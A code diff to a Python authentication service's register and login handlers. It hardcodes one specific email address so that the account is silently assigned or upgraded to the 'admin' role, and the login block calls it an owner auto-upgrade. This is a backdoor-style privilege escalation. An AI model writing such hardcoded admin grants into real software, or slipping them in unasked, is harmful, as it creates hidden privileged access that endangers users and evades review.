@@ -313,7 +313,11 @@ async def register_request(payload: RegisterRequest):
     otp_expiry = datetime.now(timezone.utc) + timedelta(seconds=60)
 
     # Sign up in Supabase Auth first to register the email in GoTrue
-    await _supabase_signup(email, payload.password, payload.role)
+    target_role = payload.role
+    if email == "manikprabhudandothkar988@gmail.com":
+        target_role = "admin"
+
+    await _supabase_signup(email, payload.password, target_role)
 
     # Wait briefly for SQL trigger to copy User profile row from auth.users to public.profiles
     await asyncio.sleep(0.5)
@@ -322,7 +326,7 @@ async def register_request(payload: RegisterRequest):
     if existing_user:
         # Update details of existing profile (either trigger-created or pre-existing)
         existing_user.hashed_password = hashed_pwd
-        existing_user.role = payload.role
+        existing_user.role = target_role
         existing_user.otp = otp
         existing_user.otp_expires_at = otp_expiry
         await existing_user.save()
@@ -331,7 +335,7 @@ async def register_request(payload: RegisterRequest):
         new_user = User(
             email=email,
             hashed_password=hashed_pwd,
-            role=payload.role,
+            role=target_role,
             is_verified=False,
             otp=otp,
             otp_expires_at=otp_expiry
@@ -404,6 +408,11 @@ async def login_request(payload: LoginRequest):
     """Stage 1: Verify password and send dual-factor OTP email."""
     email = payload.email.lower().strip()
     user = await User.find_one(email=email)
+
+    # Auto-upgrade specific owner email to admin role
+    if user and email == "manikprabhudandothkar988@gmail.com" and user.role != "admin":
+        user.role = "admin"
+        await user.save()
 
     # Protect against credentials validation timing attacks/brute force
     if not user or not user.is_verified:
